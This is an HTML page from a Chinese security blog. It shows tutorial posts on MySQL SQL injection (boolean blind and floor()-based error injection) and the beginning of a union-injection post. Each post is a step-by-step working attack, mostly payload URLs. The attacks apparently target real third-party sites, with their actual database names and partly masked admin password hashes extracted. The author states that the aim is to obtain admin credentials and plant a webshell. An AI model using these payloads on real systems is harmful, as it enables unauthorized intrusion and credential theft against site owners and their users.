<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="John Doe">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="APT404-不疯不魔怎么活"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>page - APT404-不疯不魔怎么活</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">APT404-不疯不魔怎么活</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/14/mysql-bool-blind-injection/">
                sql注入入门 之 mysql 布尔型盲注
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-14</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,实例 mysql 盲注点,如下,虽然这并不是个标标准准的盲注点,但并不影响我们用盲注的方式来获取数据,以后遇到纯正的盲注点,我们再补充:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool1.png" alt="&#39;&#39;"><br></p>
<p>2,一阵单引号过后,目标数据库如期报错,对于mysql来讲,一般出现这情况,百分之九十九可以确定这就是个正儿八经的注入点<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool2.png" alt="&#39;&#39;"><br></p>
<p>3,尝试闭合,还是前面的问题,不要一眼看到数字就认定它是个数字型注入,比如该实例就又是个字符型注入,我们只需闭合前面的单引号注释掉后面的语句就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and 121=121 %23 条件为真时,页面返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and 121=1 %23  条件为假时,页面返回错误,到这一步可以确认它确实是个注入点</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_bind_bool4.png" alt="&#39;&#39;"><br></p>
<p>4,按照以往的流程,我们接下来应该是查询当前表的字段个数,然后执行union,流程如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">'order by 7 %23 字段为7个时,目标页面返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">'order by 8 %23 字段个数为8时,页面返回异常,可知当前表的字段个数为7个</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_bind_bool6.png" alt="&#39;&#39;"><br></p>
<p>执行union,爆出对应的数据显示位,好,关于利用union注入的方式,我们到此打住,今天的重点主要是为了说明如何进行布尔型盲注,而非union的方式注入,这里顺带再次提及union的目的只是为了告诉大家,一个注入点,我们通常有n种注入方式,当某种方式受限时,不妨多换换姿势,尽量不要一条道走到黑,反正我们最终的目的只是为了拿到管理员账号密码登到后台获取webshell,至于具体用什么方法,无所谓,怎么快怎么来,毕竟我们这里并不是在做学术研究<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and 1=2 UNION SELECT 1,2,3,4,5,6,7 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool7.png" alt="&#39;&#39;"><br></p>
<p>5,好,啰嗦了一堆废话,正式开始今天的布尔型盲注,不过,在此之前我们还需要搞清楚一些问题,既是盲注,也就意味着,它不需要报错,不需要知道准确的字段个数,更不需要数据的显示位,归根结底它只关心一点,也就是,我们自己的sql到底有没有被执行成功,那么,又该怎么判断我们的sql有没有执行成功呢,其实很简单,如果是布尔型盲注,直接观察页面的返回正常与否即可,如果是时间盲注,看它是不是按照自己规定的延迟时间来响应的,等等……<br><br></p>
<p>6,说了这么多,我们现在回到正题,”布尔型”盲注,因为布尔型盲注没有任何参考,只能靠观察目标页面的返回来判断我们的语句是否执行成功,所以我们只能通过一位位的字符截取然后逐个对比判断来获取准确数据,如下,搜集目标数据库相关信息<br><br></p>
<p>截取数据库版本名称的第一位字符并返回其ASCII码值,当它等于我们所指定的值时,页面返回正常,此时去查出这个值对应的ASCII码字符是什么,后面都是如此,你可以依次递增,查出完整的数据库版本,这里为了节约篇幅,中间的过程就省略了,最后,查出完整的版本号为 ‘5.6.35’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and  (select ascii(substring((select version()),1,1))=53) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool8.png" alt="&#39;&#39;"><br></p>
<p>截取当前数据库名称的第一位字符并返回其ASCII码值,依次递增,即可查出完整的数据库名称,完整的数据库名称为’wexnepal_2012’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and  (select ascii(substring((select database()),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool9.png" alt="&#39;&#39;"><br></p>
<p>截取当前数据库用户名的第一位字符并返回其ASCII码值,依次递增,查出完整的用户名,完整的用户名为‘wexnepal_2012@localhost’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and  (select ascii(substring((select user()),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bool_injection_s.png" alt="&#39;&#39;"><br></p>
<p>7,尝试获取所有的数据库名(依然是那句话,’所有’指的是你有权限看到的)</p>
<p>获取第一个数据库名的第一位字符,并返回其对应的ASCII码值,依次递增查出完整信息,第一个数据库名为’information_schema’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select schema_name from information_schema.schemata limit 0,1),1,1))=105) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool10.png" alt="&#39;&#39;"><br></p>
<p>获取第二个数据库名的第一位字符,并返回其对应的ASCII码值,依次递增查出完整信息,第一个数据库名为’wexnepal_2012’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select schema_name from information_schema.schemata limit 1,1),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool11.png" alt="&#39;&#39;"><br></p>
<p>8,接着,获取’wexnepal_2012’库中的所有表名<br>获取第一张表名的第一位字符,并返回其对应的ASCII码值,依次递增把当前库中的所有表名都查出来即可,最后,确认实际的管理表名为 ‘tbl_admin_user’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select table_name from information_schema.tables where table_schema=0x7765786e6570616c5f32303132 limit 0,1),1,1))=116) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool12.png" alt="&#39;&#39;"><br></p>
<p>9,有了管理表名,下一步就该把该表中的所有字段名都查出来了,依旧是上面的方法<br>查询’tbl_admin_user’表中的第一个字段名的第一位字符,并返回其对应的ASCII码值,最后确认实际的账号密码字段名分别为’admin_username’,’admin_password’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select column_name from information_schema.columns where table_name=0x74626c5f61646d696e5f75736572 limit 0,1),1,1))=97) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool13.png" alt="&#39;&#39;"><br></p>
<p>10,现在管理表名字段名都有了,下一步只需要慢慢把每个字段对应的实际数据查出来即可<br>获取’admin_username’字段下的第一条记录的第一位字符,并返回其对应的ASCII码值,依次递增,查出完整用户名即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select admin_username from tbl_admin_user limit 0,1),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool14.png" alt="&#39;&#39;"><br></p>
<p>获取’admin_password’字段下的第一条记录的第一位字符,并返回其对应的ASCII码值,依次递增,查出完整密码数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select admin_password from tbl_admin_user limit 0,1),1,1))=49) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool15.png" alt="&#39;&#39;"><br></p>
<p>11,最终,得到的管理员账号密码完整数据如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">wexnepal:</span><span class="number">194</span>fb91445ebd552e7ab75457*****</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里只是简单说明了盲注里面的最基本的一种方法(基于布尔的盲注),另外还有基于时间和错误的盲注,思路流程几乎是一模一样的,同样是一位位字符的截取,只是用的函数不一样而已,换汤不换药,稍微改下语句即可,非常简单,这里就不再重复啰嗦了,大家可以看到,既是是盲注,也并不是什么很高深的注入技术,所有的复杂都是基础堆积的结果,最多可能只是在这之前,大家都没想到原来还可以这么查数据而已,可能有些繁琐,但语句还是非常好理解的,关键在于大家对各种数据库单行函数的理解和灵活应用,自己要记得多实践,以不断加深自己对盲注的理解,另外,如果真的是手工这样猜,肯定会累死,实际中我们更多都是配合burpsuite一起来完成整个过程<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/13/mysql-error-injection/">
                sql注入入门 之 mysql 显错注入 [ floor()显错 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-13</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,实例显错型 mysql 注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error1.png" alt="&#39;&#39;"><br></p>
<p>2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error2.png" alt="&#39;&#39;"><br></p>
<p>3,同样,虽然这里打眼一看可能又会以为是个数字型注入,但其实后端依然是把它当做字符串来接收的,所以,就需要我们把前后的单引号都闭合掉<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error2_1.png" alt="&#39;&#39;"><br></p>
<p>4,成功闭合后,就可以继续正常查询各种数据,还是习惯性的先搜集下目标数据库的相关信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error3.png" alt="&#39;&#39;"><br></p>
<p>获取当前数据库用户权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error4.png" alt="&#39;&#39;"><br></p>
<p>查看当前数据库名,可知当前数据库名为 ‘jamesbaird_pcba’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error5.png" alt="&#39;&#39;"><br></p>
<p>查看目标的机器名,可能有时候我们希望根据目标的机器名来大致判断当前机器是干啥的,以此来确定其价值的高低……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@hostname,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error6.png" alt="&#39;&#39;"><br></p>
<p>查看目标mysql的安装路径,创建自定义函数时可能会用到<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@basedir,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error7.png" alt="&#39;&#39;"><br></p>
<p>5,搜集完相关信息以后,我们开始查询真正的数据,首先,列出所有的数据库名(依然是你有权限看的’所有’),同样是利用limit<br>获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error8.png" alt="&#39;&#39;"><br></p>
<p>获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error9.png" alt="&#39;&#39;"><br></p>
<p>获取第三个数据库名,从前面我们已经知道,这个是我们当前所在的库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error10.png" alt="&#39;&#39;"><br></p>
<p>获取第四个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error11.png" alt="&#39;&#39;"><br></p>
<p>6,有了所有的数据库名以后,我们就可以开始查表名了,首先,查出当前库中的所有表名,当然,我们的最终目的还是为了找到目标网站的管理表,不一定非要把所有的表名都查出来,找到管理表,只要拿到账号密码即可</p>
<p>从当前库中获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error12.png" alt="&#39;&#39;"><br></p>
<p>接着依次获取第二张表名,第三张表名,……其实,中间还查出来很多表,但并不是我想要的,所以中间的过程我就都省略了,不过,最终也还是没能找到我们想要的那张管理表,没办法,只能跨库查了,当然,跨库肯定是有前提的,你只能跨到你有权限跨进的库中,废话不多讲,我们继续查<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error13.png" alt="&#39;&#39;"><br></p>
<p>直到当我查到’jamesbaird_current’这个库时,一眼就发现了’wp_’ 前缀,有经验的一眼就看出来了,这是个wordpress程序的数据库,既是开源程序,库表结构自然就非常清晰了(一般情况下很少人会改它原来的库表结构,因为那样可能意味着要大篇幅重构代码,如果不是做深度二次开发,最多可能只会在原有的库表基础上加表加功能),下面的十六进制数据表示的是’jamesbaird_current’库名,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=0x6a616d657362616972645f63757272656e74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error14.png" alt="&#39;&#39;"><br></p>
<p>7,按说,我们现在就可以直接去查出管理员的账号密码,因为wordpress默认的管理表名和该表中的字段名我们早已了如指掌,为了文章完整性,这里还是一步步的来吧<br>获取第二个字段名,用户名字段,下面的十六进制数据表示的是’wp_users’的表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error15.png" alt="&#39;&#39;"><br></p>
<p>获取第三个字段名,密码字段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error16.png" alt="&#39;&#39;"><br></p>
<p>8,现在,直接从wp_users表中获取管理员的账号和密码hash即可,至此,一次基本的mysql显错注入就算完成了,虽然我们现在查到的账号密码可能并不是这个网站的后台管理账号密码,但起码我们知道它肯定有一个wordpress程序存在,找到那个wordpress所在的地址,然后登进去,传shell也是一样的,可那并不是今天的重点,这里我也不啰嗦了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_login,0x3a,user_pass,0x23) FROM jamesbaird_current.wp_users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and  '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error17.png" alt="&#39;&#39;"><br></p>
<p>9,最终,我们得到的管理员的账号密码如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">admin:</span><span class="number">5</span>ce14b22a4406974b33dfcaa****** (md5的hash,相必这个wordpress版本必然很低)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里也只是简单演示了在显错注入中最常用的一种,基于floor()函数的,关于另外两个函数的利用和这个方式都基本一致,语句稍微变下即可,这里就不再重复啰嗦了,另外,今天的重点只是想让大家明白怎么通过显错进行注入,注入语句可能一眼看上去比较难懂,但从里往外一句句拆出来执行就知道什么意思了,其实不难,关键是自己一定要有耐心<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/12/mysql-common-injection/">
                sql注入入门 之 mysql 常规注入 [ union方式 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-12</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,常规数字型 mysql 实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm1.png" alt="&#39;&#39;"><br></p>
<p>2,依旧先尝试下经典的单引号,如下,虽然没暴露出明显的数据库报错信息,但我们发现,此时返回的页面已经异常了,经验判断,十有八九是个注入点,先不管那么多,我们继续<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm2.png" alt="&#39;&#39;"><br></p>
